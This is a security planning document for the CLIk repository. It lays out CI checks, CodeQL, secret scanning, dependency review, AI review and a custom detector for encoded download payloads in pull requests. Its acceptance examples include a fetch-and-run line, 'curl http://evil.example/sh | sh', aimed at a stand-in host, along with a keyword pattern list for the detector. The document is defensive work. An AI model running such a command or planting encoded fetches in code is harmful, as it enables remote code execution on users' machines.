---
title: "PR Security Review - Plan"
type: feat
date: 2026-07-12
topic: pr-security-review
artifact_contract: ce-unified-plan/v1
artifact_readiness: implementation-ready
product_contract_source: ce-brainstorm
execution: code
---

# PR Security Review - Plan

## Goal Capsule

- **Objective:** Establish layered, all-free PR security review on the open-source CLIk repo so malicious contributions cannot reach the auto-update channel — covering obfuscated external-download payloads, malicious dependencies, and leaked secrets.
- **Product authority:** Solo repo maintainer confirmed threat scope, enforcement posture, and tool choices during brainstorm.
- **Open blockers:** None blocking planning. Tuning decisions (action versions, obfuscation thresholds, deeper npm analysis) are deferred to planning.

---

## Product Contract

> Product Contract preservation: unchanged except R9, tightened from "first-time contributors" to "all external contributors" (closes a bypass; consistent with the strict-gating decision). See KTD4.

### Summary

A layered, all-free PR security setup for CLIk: a deterministic GitHub-native backbone (supply-chain, secrets, SAST) plus CodeRabbit's AI review, plus one small custom CI job that decodes base64/hex in PR diffs and flags decoded external-download payloads. Strict branch protection requires the deterministic checks and code-owner approval; AI review stays advisory.

### Problem Frame

CLIk executes arbitrary command-line tools in PTYs, spawns `child_process` for `--help` discovery, and auto-updates every install from GitHub releases (`electron-updater`, `package.json`). A single malicious PR that sneaks an encoded fetch into the shipped app reaches every user on the next auto-update. The project has no CI today (`.github/` is absent), so every contribution currently relies on unaided human review. The maintainer's named worry — code that downloads from an external URL via an obfuscated or encoded payload — is precisely the case where rule-based scanners are weakest and where a deterministic decode check plus AI review earn their place.

### Key Decisions

- **Defense in depth over a single tool.** The app's surface spans three vectors (source, supply chain, runtime egress), and strict gating needs deterministic checks you can require; no single tool covers all three.
- **CodeRabbit as the AI reviewer.** Free forever for public repos and the dominant standalone PR reviewer; chosen over GitHub Copilot code review (less configurable) and "Cursor bot" (IDE-centric, not a canonical free OSS PR-review product).
- **Strict gating over advisory-only.** Required deterministic checks plus code-owner approval; a PR that is only commented on but still merged is still merged.
- **Managed stack plus one custom check over a full in-house pipeline.** Reliable coverage of the obfuscation worry without owning a whole scanner.
- **Plain `pull_request`, never `pull_request_target` with a PR checkout.** Fork-PR code must never run with access to repo secrets — the classic exfiltration vector.

### Actors

- A1. **Maintainer (solo, code owner)** — sole merger; performs per-PR triage and approval.
- A2. **Outside contributor** — opens fork PRs; cannot trigger Actions until approved.
- A3. **CodeRabbit GitHub App** — posts advisory reviews server-side on every PR, including forks, independent of Actions.
- A4. **GitHub Actions runners** — execute the deterministic required checks.

### Requirements

**Supply-chain scanning**

- R1. Every PR that changes dependencies passes automated dependency review that blocks known-vulnerable or advisory-bearing package adds.
- R2. Dependabot (or equivalent) opens tracked PRs for vulnerable or outdated dependencies on a schedule.

**Source & secret scanning**

- R3. Every PR is scanned for leaked secrets and credentials, blocking on findings.
- R4. Every PR runs SAST (CodeQL) over the codebase, blocking on new findings.

**AI review**

- R5. CodeRabbit reviews every PR (internal and fork) with a security focus, posting advisory comments that never block merge.

**Custom obfuscation detection**

- R6. A custom CI job analyzes the PR diff for encoded/obfuscated payloads: it decodes candidate base64/hex strings and flags any decoded result containing a URL, `curl|sh`, or a known payload shape; it also flags high-entropy strings that do not decode to benign content. It is a required (blocking) check.

**Enforcement & gating**

- R7. Branch protection on the default branch requires all deterministic checks (R1, R3, R4, R6) plus code-owner approval (`CODEOWNERS`) before merge; CodeRabbit is never a required check.
- R8. No PR-triggered security job exposes secrets to untrusted code — jobs run on the `pull_request` event with read-only token and no secret access; `pull_request_target` with a PR checkout is prohibited.

**Contributor policy & maintainer runbook**

- R9. Outside-collaborator fork PRs do not run Actions until a maintainer approves (repo Actions policy set to "Require approval for all external contributors" — stricter than first-time-only, which becomes bypassable after a single merged commit).
- R10. A short maintainer runbook documents the per-PR routine: eyeball the diff plus CodeRabbit's review, click "Approve and run" for fork PRs, verify checks are green, approve, merge.

### Key Flows

- F1. External (fork) contribution
  - **Trigger:** An outside contributor opens a fork PR (A2).
  - **Actors:** A2, A3, A1, A4.
  - **Steps:** CodeRabbit (A3) posts its review automatically; Actions (A4) stay blocked pending maintainer approval; the maintainer (A1) triages the diff plus CodeRabbit's comment, then clicks "Approve and run"; the deterministic required checks execute; if green, the maintainer approves and merges.
  - **Outcome:** A malicious or failing PR cannot merge — it is either caught before Actions run, fails a required check, or lacks approval.
  - **Covered by:** R5, R7, R9, R10.
  - **Note:** Same-repo PRs skip the fork approval gate; everything else is identical.

### Acceptance Examples

- AE1. **Covers R6.** Given a PR whose diff adds a base64 blob that decodes to `curl http://evil.example/sh | sh`; when the obfuscation job runs; then the check fails and merge is blocked.
- AE2. **Covers R6.** Given a PR whose diff adds a benign high-entropy value (e.g., a color hash or a test fixture); when the obfuscation job runs; then the check passes with no false flag.
- AE3. **Covers R9.** Given a first-time outside contributor opens a fork PR; when the PR is created; then Actions do not run until the maintainer clicks "Approve and run."
- AE4. **Covers R8.** Given a fork PR that alters workflow files to reference a secret; when the job runs under `pull_request`; then no secret is exposed to the PR's code.

### Success Criteria

- SC1. A deliberately malicious test PR (encoded-download payload, a known-vulnerable dependency, a planted secret) is blocked from merging by the required checks.
- SC2. The entire setup runs on free tiers (CodeRabbit OSS, GitHub-native features) with no recurring cost.
- SC3. A normal external bug-fix PR reaches merge with only the maintainer's approve-and-run and approval — no false blocks.

### Scope Boundaries

**Deferred for later**

- Release/auto-update channel integrity (verifying `electron-updater` assets, signed releases) — adjacent to the auto-update risk but a separate problem from PR review.
- SBOM / SLSA build provenance.
- macOS code-signing and notarization of the build.
- A full in-house security pipeline (entropy tuning, a runtime network-egress allowlist enforced in tests); the custom obfuscation check's deterministic subset covers the named threat, and deeper hardening is deferred.

**Outside this product's identity**

- Runtime behavioral sandboxing of the CLIs CLIk launches — CLIk executes user-chosen CLIs by design.

### Dependencies / Assumptions

- CodeRabbit's free-for-public-repos tier covers this repo; assumes the repo remains public/OSS.
- GitHub-native features (CodeQL, secret scanning, dependency-review-action, Dependabot) are available at no cost for public repos.
- The custom obfuscation check can be expressed as a CI script reading the PR diff via the GitHub API, with no external paid service.

### Outstanding Questions

**Deferred to planning**

- Exact action versions and job layout (where the obfuscation script lives, script language choice).
- Whether to add a deeper npm supply-chain tool (e.g., Socket) beyond dependency-review.
- Entropy threshold and decode-depth tuning for the obfuscation check to minimize false positives.
- Whether `CODEOWNERS` expands beyond the solo maintainer as the project grows.

### Sources / Research

- Repo risk surface: `package.json` (deps `node-pty`, `electron-updater`; `postinstall` rebuild; `publish` to GitHub), `README.md` (PTY execution, `child_process.spawn` for `--help`, auto-update from GitHub releases).
- No existing CI: `.github/` is absent at the repo root.
- CodeRabbit is free forever for public/OSS repos and is the dominant standalone AI PR reviewer (coderabbit.ai/pricing); this is the standard free option, not "Cursor bot."
- The named threat (obfuscated/encoded external-URL download) is the case where AI review plus a deterministic decode check beat rule-based SAST alone.

---

## Planning Contract

### Key Technical Decisions

- **KTD1. CodeQL via Default setup, not a custom workflow.** GitHub recommends Default setup for small repos; it auto-detects `javascript-typescript` (no build step) and runs on PRs + schedule with zero workflow file. Scope it to JS/TS only — `node-pty` is a vendored C++ native module that would force a compiled-language build mode. A custom workflow would risk duplicate-alert origins alongside Default setup. *(Covers R4.)*
- **KTD2. Native push protection + secret scanning as the required secret layer; gitleaks deferred.** Push protection (free for public repos) blocks a secret before it reaches history or a PR diff — stronger than any post-hoc scanner. `gitleaks-action` overlaps native scanning and introduces a fork-PR token gap (no secrets injected on fork PRs) plus a license step for org repos. Revisit gitleaks only if custom secret patterns are needed later. *(Covers R3.)*
- **KTD3. Custom obfuscation detector as a Node `.mjs` script.** Matches the repo's existing ESM-script convention (`scripts/release.mjs`). Runs on the `pull_request` event (never `pull_request_target`), performs **static** analysis only (no `npm install` of PR code), receives the diff via an environment variable to prevent script injection via PR metadata, and scans added lines only to limit false positives. *(Covers R6, R8.)*
- **KTD4. Fork-PR approval set to "all external contributors".** "First-time contributors" is bypassable after one merged commit; "all external contributors" closes that hole and matches the strict-gating decision. This is the R9 refinement noted above. *(Covers R9.)*
- **KTD5. CodeRabbit review status is advisory (non-required).** AI checks are noisy and must not gate merges. CodeRabbit's bundled `tools` (eslint, oxlint, semgrep, osv-scanner, betterleaks, actionlint) provide extra SAST/secret/vuln scanning at no cost, layered on the deterministic backbone. It reviews fork PRs server-side via webhook, independent of Actions secrets. *(Covers R5.)*
- **KTD6. Solo-maintainer gating avoids self-deadlock.** Requiring code-owner approval on your own PRs deadlocks a solo maintainer. The ruleset includes a bypass list for the repo owner and requires the deterministic checks; CODEOWNERS still requests review. "Required approval" realistically means adding a trusted second reviewer when one becomes available. *(Covers R7; flagged in Outstanding Questions.)*
- **KTD7. Dependabot keeps action tags current via the `github-actions` ecosystem.** The `@v4`/`@v5`/`@v6` action pins drift over time; a `github-actions` Dependabot entry bumps them automatically. Dependabot's sandboxed runtime does not execute the `node-pty` `postinstall` rebuild. *(Covers R2.)*

### High-Level Technical Design

The pipeline is a deterministic backbone (repo settings + two small workflows + one script + one Dependabot config) with CodeRabbit as an advisory AI layer. Deterministic checks gate merges; AI does not. The fork-PR security model is the load-bearing constraint: every job that touches PR-supplied content runs on `pull_request` with read-only `GITHUB_TOKEN` and no secrets, and never checks out and executes PR code with elevated privileges.

Files added: `.github/workflows/ci.yml`, `.github/workflows/dependency-review.yml`, `.github/workflows/obfuscation-scan.yml`, `.github/scripts/obfuscation-scan.mjs`, `.github/dependabot.yml`, `.github/CODEOWNERS`, `.coderabbit.yaml`, `docs/security/maintainer-runbook.md`, `docs/security/test-fixtures/`. Repo settings configured (not files): CodeQL Default setup, secret scanning + push protection, fork-PR approval policy, branch-protection ruleset.

### Assumptions

- The repo remains public, so every layer (CodeQL, secret scanning/push protection, dependency graph, CodeRabbit OSS tier) stays free.
- As a solo maintainer you accept self-review on your own PRs until a second trusted reviewer joins (see KTD6).
- CodeRabbit's free-for-OSS tier continues to cover a repo of this size.

### Sequencing

1. Enable CodeQL Default setup (JS/TS) + secret scanning + push protection in repo Settings — immediate baseline protection before any workflow exists.
2. Add `.github/CODEOWNERS`, `.github/dependabot.yml`, the two security workflows, and the obfuscation script.
3. Install the CodeRabbit GitHub App and add `.coderabbit.yaml`.
4. After the checks have run at least once on the default branch, configure the branch-protection ruleset (so the check names are selectable as required) and the fork-PR approval policy.
5. Add the maintainer runbook and validate end-to-end with a deliberately malicious test PR (encoded-download payload + a known-vulnerable dep + a planted secret) that the pipeline blocks.

---

## Implementation Units

### U1. Baseline CI (typecheck + test)

- **Goal:** Provide the required-check carrier and ensure PRs don't break the build. Strict gating needs a build-quality check alongside the security checks.
- **Files:** `.github/workflows/ci.yml`
- **Patterns:** `actions/checkout@v6` (default depth is fine); run `npm ci`, `npm run typecheck`, `npm test` on Node 20 LTS across the `pull_request` and `push` to default branch events. `npm ci` requires the committed `package-lock.json` (present). `postinstall` runs `electron-rebuild` for `node-pty`, which is acceptable in CI on the runner.
- **Test scenarios:** a PR that breaks a type or a unit test fails the check; a clean PR passes.
- **Verification:** `npm run typecheck && npm test` green locally mirrors the check.

### U2. CodeQL SAST + secret scanning + push protection

- **Goal:** Static analysis on JS/TS and block leaked secrets at push time.
- **Files:** none — repo Settings → Code security. (CodeQL Default setup, not a workflow file.)
- **Patterns:** CodeQL Default setup scoped to `javascript-typescript`; enable Secret scanning and Push protection. No `pull_request_target` involved (these are GitHub-managed).
- **Test scenarios:** push a fake AWS/GitHub token → push protection blocks it; a PR introducing a CodeQL-detectable injection pattern → alert appears in the Security tab.
- **Verification:** Security tab shows CodeQL configured; a planted secret in a throwaway branch is rejected at push.

### U3. Dependency gate + Dependabot

- **Goal:** Block PRs that introduce vulnerable dependencies; keep deps and action tags current.
- **Files:** `.github/workflows/dependency-review.yml`, `.github/dependabot.yml`
- **Patterns:** `dependency-review-action@v5` on `pull_request` touching `package.json`/`package-lock.json`, `fail-on-severity: high`, `fail-on-scopes: [runtime]`; Dependabot `version: 2` with two `updates` entries — `npm` (`directory: "/"`, weekly, grouped minor/patch) and `github-actions` (`directory: "/"`, weekly) to keep `@v4`/`@v5`/`@v6` pins current.
- **Test scenarios:** a PR adding a package with an active GHSA advisory at or above the threshold fails; Dependabot opens a scheduled bump PR.
- **Verification:** the dependency-review check appears and fails/passes on the relevant PRs.

### U4. Custom obfuscation / encoded-payload detector

- **Goal:** Deterministically flag encoded external-download payloads in PR diffs — the named threat that rule-based SAST misses.
- **Files:** `.github/workflows/obfuscation-scan.yml`, `.github/scripts/obfuscation-scan.mjs`
- **Patterns:** triggered on `pull_request` (never `pull_request_target`); `permissions: { contents: read, pull-requests: read }`; fetch the diff safely — either `gh pr diff <number>` piped through an env var, or `actions/checkout@v6` with `fetch-depth: 0` then `git diff --diff-filter=A` for added lines. The script: collect candidate tokens (long base64/hex runs), attempt decode, and flag any decoded result matching `https?://`, `curl`, `wget`, `|\s*sh`, `eval(`, `child_process`; also flag high-entropy added lines that do not decode to benign content; honor an allowlist for minified JS, sourcemaps, and known hashes; write findings to `$GITHUB_STEP_SUMMARY`; exit non-zero on a hit. All PR-derived text is read from an environment variable, never interpolated into a shell command (prevents injection).
- **Test scenarios (Acceptance Examples AE1, AE2):** AE1 — a diff adding a base64 blob that decodes to `curl http://evil.example/sh | sh` fails the check; AE2 — a benign color hash or test fixture passes. Added: a chunk of minified JS is allowlisted and does not false-trigger.
- **Verification:** run `node .github/scripts/obfuscation-scan.mjs` locally over a fixture diff reproducing AE1 (non-zero exit) and AE2 (zero exit).

### U5. CodeRabbit AI review

- **Goal:** Advisory AI review on every PR, including forks, for the obfuscation case and general quality.
- **Files:** `.coderabbit.yaml` (repo root); install the CodeRabbit GitHub App.
- **Patterns:** `reviews.auto_review.enabled: true`, `path_filters` excluding `dist/**`, `out/**`, `build/**`, `node_modules/**`, `package-lock.json`; `tools` enabling `eslint`, `oxlint`, `semgrep`, `osv-scanner`, `betterleaks`, `actionlint` and disabling irrelevant ones (`tflint`, `checkov`, `hadolint`); `knowledge_base` auto-loads `AGENTS.md`.
- **Test scenarios:** open any PR → CodeRabbit posts a walkthrough and line comments; an external fork PR also receives a review (server-side, no Actions secrets).
- **Verification:** the "CodeRabbit Review" status appears and is configured **non-required** in the ruleset.

### U6. Branch protection ruleset + CODEOWNERS + fork-PR policy

- **Goal:** Enforce that deterministic checks pass and code-owner review is requested before merge; fork PRs require maintainer approval to run Actions.
- **Files:** `.github/CODEOWNERS`; repo Settings → Rulesets; Settings → Actions → General.
- **Patterns:** `.github/CODEOWNERS` owns `*` and `/.github/` (so a PR cannot rewrite its own reviewers) set to the maintainer. Ruleset on the default branch: require a PR, require status checks (`ci`/typecheck+test, `dependency-review`, `obfuscation-scan`, CodeQL code-scanning), require review from Code Owners, with a bypass list containing the maintainer (avoids the solo self-deadlock per KTD6). Fork-PR workflow approval set to "Require approval for all external contributors" (KTD4).
- **Test scenarios:** a PR failing any required check cannot be merged; an external fork PR shows "Approve and run" before any Actions job executes; a `.github/` change still requests the maintainer as owner.
- **Verification:** attempt to merge a red-check PR → blocked; inspect the ruleset's required-check list.

### U7. Maintainer runbook + malicious-PR validation fixtures

- **Goal:** Document the per-PR triage routine and provide canned malicious inputs to validate the pipeline end-to-end.
- **Files:** `docs/security/maintainer-runbook.md`, `docs/security/test-fixtures/`
- **Patterns:** the runbook records the routine from R10 (eyeball + CodeRabbit review → "Approve and run" on fork PRs → verify green → approve → merge), the fork-PR policy, and the `pull_request_target` prohibition. Fixtures include an encoded-download payload, a known-vulnerable dependency reference, and a planted secret for a one-off validation PR.
- **Test scenarios (Success Criteria SC1):** a single validation PR carrying all three malicious signals is blocked before merge by the required checks and push protection.
- **Verification:** SC1 passes on the validation PR; the runbook is linked from `README.md` or `AGENTS.md` for discoverability.

---

## Verification Contract

| Check | Mechanism / command | Source unit | Required to merge |
|---|---|---|---|
| typecheck | `npm run typecheck` | U1 | yes |
| unit tests | `npm test` | U1 | yes |
| CodeQL code scanning | Default setup (repo Settings) | U2 | yes |
| push protection | repo Settings | U2 | yes (blocks at push) |
| dependency-review | `actions/dependency-review-action@v5` | U3 | yes |
| obfuscation-scan | `node .github/scripts/obfuscation-scan.mjs` over the PR diff | U4 | yes |
| CodeRabbit Review | GitHub App, server-side | U5 | no (advisory) |

Repo commands to mirror locally: `npm run typecheck && npm test`; for the obfuscation detector, `node .github/scripts/obfuscation-scan.mjs` over a fixture diff.

---

## Definition of Done

- All listed files exist and all listed repo settings are enabled.
- The branch-protection ruleset is active and requires the deterministic checks.
- A deliberately malicious validation PR (encoded-download payload per AE1, a known-vulnerable dependency, and a planted secret) is blocked before merge — Success Criterion SC1.
- A normal external bug-fix PR reaches merge after "Approve and run" + green checks + approval — Success Criterion SC3.
- The maintainer runbook is committed and discoverable from `README.md` or `AGENTS.md`.

---

## Appendix: External Research Notes

- CodeQL: `github/codeql-action@v4` is current (v3 deprecating); Default setup is GitHub-recommended for small repos. Source: `github.com/github/codeql-action`.
- Dependency review: `actions/dependency-review-action@v5` gates on GHSA advisories. Source: `github.com/actions/dependency-review-action`.
- Dependabot: config at `.github/dependabot.yml`; `npm` + `github-actions` ecosystems. Source: `docs.github.com/en/code-security/dependabot`.
- Secret scanning + push protection are free for public repos. Source: `docs.github.com/en/code-security/secret-scanning`.
- CodeRabbit config reference and bundled `tools`. Source: `docs.coderabbit.ai/reference/configuration`.
- `pull_request` (read-only, no secrets on forks) vs `pull_request_target` (read-write, secrets) — the latter must never check out and run PR code. Source: `docs.github.com/en/actions/security-guides/security-hardening-for-github-actions`.
- Rulesets supersede classic branch protection; CODEOWNERS lives at `.github/CODEOWNERS`. Source: `docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-rulesets`.
